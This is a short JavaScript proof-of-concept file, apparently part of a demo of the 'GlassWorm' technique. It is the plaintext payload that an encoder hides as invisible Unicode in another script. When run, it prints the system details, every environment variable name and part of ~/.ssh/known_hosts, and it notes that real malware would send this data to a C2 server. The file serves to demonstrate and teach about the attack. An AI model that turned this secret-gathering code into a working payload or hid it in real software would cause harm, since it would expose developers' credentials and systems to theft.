// ⚠️ EDUCATIONAL POC — This is the PLAINTEXT source of the demo payload.
// The encoder converts this into invisible Unicode in payload-demo.js.

console.log('\n⚠️  GLASSWORM POC — ATTACK SIMULATION\n');
console.log('=== System Info ===');
console.log('Platform:', process.platform);
console.log('Node:', process.version);
console.log('CWD:', process.cwd());
console.log('User:', require('os').userInfo().username);

console.log('\n=== Environment Variable Keys (secrets exposed!) ===');
var keys = Object.keys(process.env).sort();
console.log('Found', keys.length, 'env vars:');
console.log(keys.join(', '));

try {
  var hosts = require('fs').readFileSync(
    require('os').homedir() + '/.ssh/known_hosts', 'utf-8'
  );
  console.log('\n=== ~/.ssh/known_hosts (first 500 chars) ===');
  console.log(hosts.slice(0, 500));
  console.log('... (' + hosts.length + ' total chars)');
} catch(e) {
  console.log('\n~/.ssh/known_hosts not readable (but COULD access any file)');
}

console.log('\n⚠️  Real malware would exfiltrate ALL of this to a C2 server.');
console.log('⚠️  END SIMULATION\n');
